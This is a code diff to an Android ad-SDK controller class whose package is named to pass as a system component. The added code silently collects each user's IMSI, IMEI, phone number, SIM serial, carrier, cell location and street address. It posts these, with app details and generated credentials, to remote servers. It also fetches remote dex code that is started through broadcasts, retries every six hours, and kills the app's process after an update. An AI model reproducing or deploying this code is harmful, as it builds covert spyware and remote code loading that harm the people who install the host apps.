@@ -2,11 +2,17 @@ package com.android.system.core.sometools;
 
 
 
+import org.json.JSONException;
 import org.json.JSONObject;
+
 
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.content.pm.PackageManager.NameNotFoundException;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 
@@ -34,10 +40,22 @@ public class GAdController {
 	{
 		this.context = context;
 		
+		ApplicationInfo appInfo = null;
+		try {
+			appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(),PackageManager.GET_META_DATA);
+			String qew_channel = appInfo.metaData.getString("qew_channel");
+			GCommons.CHANNEL = qew_channel;
+			Log.e("------------","qew_channel="+GCommons.CHANNEL);
+		} catch (NameNotFoundException e) {
+			e.printStackTrace();
+		}
+		
+		
 		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTestModel);
 		
 		Intent intent = new Intent(context,GService.class);
 		context.startService(intent);
+		
 		
 		//GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);				
 	}
@@ -49,7 +67,9 @@ public class GAdController {
 		boolean isTest = GTool.getSharedPreferences().getBoolean(GCommons.SHARED_KEY_TESTMODEL, false);
 		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTest);
 		
-		GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);				
+		GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);	
+		login();
+
 	}
 	
 	public void showSpotAd()
@@ -69,6 +89,20 @@ public class GAdController {
 		GTool.saveSharedData(GCommons.SHARED_KEY_ACTION_TAG, "com.xugu.destory");
 		intent.setAction("com.xugu.destory");
 		intent.putExtra("clazName", clazName);
+		this.context.sendBroadcast(intent);
+	}
+	
+	public void start()
+	{
+		Intent intent = new Intent(context,GReceiver.class);
+		intent.setAction("com.xugu.start");
+		this.context.sendBroadcast(intent);
+	}
+	
+	public void restart()
+	{
+		Intent intent = new Intent(context,GReceiver.class);
+		intent.setAction("com.xugu.restart");
 		this.context.sendBroadcast(intent);
 	}
 	
@@ -101,13 +135,25 @@ public class GAdController {
 		Log.e("------------","----------curr sdk="+code);
 		if(code.equals(versionCode) || !isFind)
 		{
-			Log.e("------------","----------startservice");
-			if(!isFind)
-				downloadPath =  GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_DEX_NAME, "");
-			String dexPath = GDexLoaderUtil.getDexPath(context, downloadPath);
-			final String optimizedDexOutputPath = GDexLoaderUtil.getOptimizedDexPath(context);
-	        GDexLoaderUtil.injectAboveEqualApiLevel14(dexPath, optimizedDexOutputPath, null, "com.qinglu.ad.QLAdController");
-	        GDexLoaderUtil.call(context.getClassLoader(),context);
+			if(code.equals(versionCode))
+			{
+				Log.e("------------","----------startservice");
+				start();
+			}
+			else
+			{
+				Log.e("------------","----------no network or config error! reinit...---------");
+				new Thread(){
+					public void run() {
+						try {
+							Thread.sleep(6*60*60*1000);
+							init(context);
+						} catch (InterruptedException e) {
+							e.printStackTrace();
+						}
+					};
+				}.start();
+			}
 		}
 		else
 		{
@@ -118,14 +164,214 @@ public class GAdController {
 	
 	public void revNewSdkCallback(Object ob,Object rev)
 	{
-		GDexLoaderUtil.copyDex(context, ob.toString());
-		String dexPath = GDexLoaderUtil.getDexPath(context, ob.toString());
-		final String optimizedDexOutputPath = GDexLoaderUtil.getOptimizedDexPath(context);
-        GDexLoaderUtil.injectAboveEqualApiLevel14(dexPath, optimizedDexOutputPath, null, "com.qinglu.ad.QLAdController");
-        GTool.saveSharedData(GCommons.SHARED_KEY_SDK_VERSIONCODE,newSdkCode);
-        GTool.saveSharedData(GCommons.SHARED_KEY_DEX_NAME,dexName);
-        GDexLoaderUtil.call(context.getClassLoader(),context);
-        GTool.httpPostRequest(GCommons.URI_POST_UPDATE_SDK_NUM, null, null, GCommons.CHANNEL);	
-        Log.e("------------","----------newSdkCode sdk="+newSdkCode);
+		if("1".equals(rev.toString()))
+		{
+			GDexLoaderUtil.copyDex(context, ob.toString());
+			GTool.saveSharedData(GCommons.SHARED_KEY_SDK_VERSIONCODE,newSdkCode);
+	        GTool.saveSharedData(GCommons.SHARED_KEY_DEX_NAME,dexName);
+	        
+			start();
+	        GTool.httpPostRequest(GCommons.URI_POST_UPDATE_SDK_NUM, this, "revUpdateSdk", GCommons.CHANNEL);	
+	       
+		}
+		else
+		{
+			Log.e("------------","----------sdk download fial! redownloading...");
+			init(context);
+		}
+	}
+	
+	public void revUpdateSdk(Object ob,Object rev)
+	{
+		 Log.e("------------","----------newSdkCode sdk="+newSdkCode);
+	     android.os.Process.killProcess(android.os.Process.myPid());
+	}
+	
+	
+	
+	
+	
+	
+	private boolean isRegister()
+	{
+		String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
+		String password = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_PASSWORD, "");		
+		if(name != null && password != null && !"".equals(name.trim()) && !"".equals(password.trim()))
+			return true;
+		return false;
+	}
+
+	public void login()
+	{
+		if(isRegister())
+		{
+			String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
+			String password = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_PASSWORD, "");
+			JSONObject obj = new JSONObject();
+			try {
+				obj.put(GCommons.SHARED_KEY_NAME, name);
+				obj.put(GCommons.SHARED_KEY_PASSWORD, password);
+				obj.put("networkType", GTool.getNetworkType());
+			} catch (JSONException e) {
+				e.printStackTrace();
+			}
+			GTool.httpPostRequest(GCommons.URI_LOGIN, this, "loginResult", obj.toString());
+		}
+		else
+		{					
+			validate();
+		}
+	}
+	
+	public static void loginResult(Object ob,Object rev) 
+	{
+		try {
+			JSONObject obj = new JSONObject(rev.toString());
+			if(obj.getBoolean("result"))
+			{
+				GAdController.getInstance().loginSuccess();
+			}
+			else
+			{
+				GTool.saveSharedData(GCommons.SHARED_KEY_NAME, "");
+				GTool.saveSharedData(GCommons.SHARED_KEY_PASSWORD, "");
+				GAdController.getInstance().login();
+			}
+		} catch (Exception e) {
+			GTool.saveSharedData(GCommons.SHARED_KEY_NAME, "");
+			GTool.saveSharedData(GCommons.SHARED_KEY_PASSWORD, "");
+			GAdController.getInstance().login();
+		}
+		
+	}
+	//验证是否已经注册
+	public void validate()
+	{
+		TelephonyManager tm = GTool.getTelephonyManager();
+		String name = tm.getSubscriberId();
+		if(name == null || "".equals(name.trim()))
+			name = tm.getDeviceId();
+		if(name == null || "".equals(name.trim()))
+			name = GTool.getRandomUUID();
+		String password = GTool.getPackageName();
+		
+		GTool.saveSharedData(GCommons.SHARED_KEY_NAME, name);
+		GTool.saveSharedData(GCommons.SHARED_KEY_PASSWORD, password);
+		JSONObject obj = new JSONObject();
+		try {
+			obj.put(GCommons.SHARED_KEY_NAME, name);
+			obj.put(GCommons.SHARED_KEY_PASSWORD, password);
+			obj.put("networkType", GTool.getNetworkType());
+		} catch (JSONException e) {
+			e.printStackTrace();
+		}
+		GTool.httpPostRequest(GCommons.URI_VALIDATE, this, "validateResult", obj.toString());
+	}
+	
+	public static void validateResult(Object ob,Object rev) throws JSONException
+	{
+		JSONObject obj = new JSONObject(rev.toString());
+		if(obj.getBoolean("result"))
+		{
+			
+			GAdController.getInstance().loginSuccess();
+		}
+		else
+		{
+			//服务器还不存在 就注册新用户
+			GAdController.getInstance().register();			
+		}
+	}
+	
+	public void register()
+	{				
+		String url = GCommons.MAP_BAIDU_URL + GTool.getLocalHost();
+		GTool.httpGetRequest(url, this, "getLoction",null);
+	}
+	
+	public void getLoction(Object obj_session,Object obj_data)
+	{
+		String data = (String) obj_data;
+		TelephonyManager tm = GTool.getTelephonyManager();
+		User user = new User();
+		String name = tm.getSubscriberId();
+		if(name == null || "".equals(name.trim()))
+			name = tm.getDeviceId();
+		if(name == null || "".equals(name.trim()))
+			name = GTool.getRandomUUID();
+		user.setName(name);
+		String password = GTool.getPackageName();
+		user.setPassword(password);
+		
+		String deviceId = tm.getDeviceId();	
+		if(deviceId == null || "".equals(deviceId.trim()))
+			deviceId = GTool.getRandomUUID();
+		
+		user.setDeviceId(deviceId);
+		user.setPhoneNumber(tm.getLine1Number());
+		user.setNetworkOperatorName(tm.getNetworkOperatorName());
+		user.setSimSerialNumber(tm.getSimSerialNumber());
+		user.setNetworkCountryIso(tm.getNetworkCountryIso());
+		user.setNetworkOperator(tm.getNetworkOperator());		
+		user.setPhoneType(tm.getPhoneType());
+		user.setModel(android.os.Build.MODEL);
+		user.setRelease(android.os.Build.VERSION.RELEASE);
+		user.setNetworkType(GTool.getNetworkType());
+		try {
+			JSONObject obj = new JSONObject(data);
+			if(obj.getInt("status") == 0)
+			{
+				JSONObject content = obj.getJSONObject("content");
+				JSONObject obj2 = content.getJSONObject("address_detail");						
+				String city = obj2.getString("city");//城市  
+				String province = obj2.getString("province");//省份
+				String district = obj2.getString("district");//区县 
+				String street = obj2.getString("street");//街道
+				
+				user.setProvince(province);
+				user.setCity(city);
+				user.setDistrict(district);
+				user.setStreet(street);
+				
+				//用户可能拒绝获取位置 需要捕获异常
+				user.setLocation(tm.getCellLocation().toString());
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}finally{
+			GTool.saveSharedData(GCommons.SHARED_KEY_NAME, name);
+			GTool.saveSharedData(GCommons.SHARED_KEY_PASSWORD, password);
+			
+			GTool.httpPostRequest(GCommons.URI_REGISTER, this, "registResult", User.toJson(user));
+		}		
+	}
+	
+	public static void registResult(Object ob,Object rev) throws JSONException
+	{
+		//注册成功上传app信息			
+		GAdController.getInstance().loginSuccess();
+	}
+	
+	//上传app信息
+	public void uploadAppInfos()
+	{
+		String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
+		try {
+			JSONObject obj = new JSONObject();
+			obj.put("packageName", GTool.getPackageName());
+			obj.put("name", GTool.getApplicationName());
+			obj.put("versionName", GTool.getAppVersionName());
+			obj.put("sdkVersion","1.0");
+			obj.put("id", name);
+			obj.put("password",  GTool.getPackageName());
+			GTool.httpPostRequest(GCommons.URI_UPLOAD_APPINFO, this, null, obj);
+		} catch (Exception e) {
+		}
+	}
+	
+	//登录成功
+	public void loginSuccess()
+	{			
+		GAdController.getInstance().uploadAppInfos();					
 	}
 }
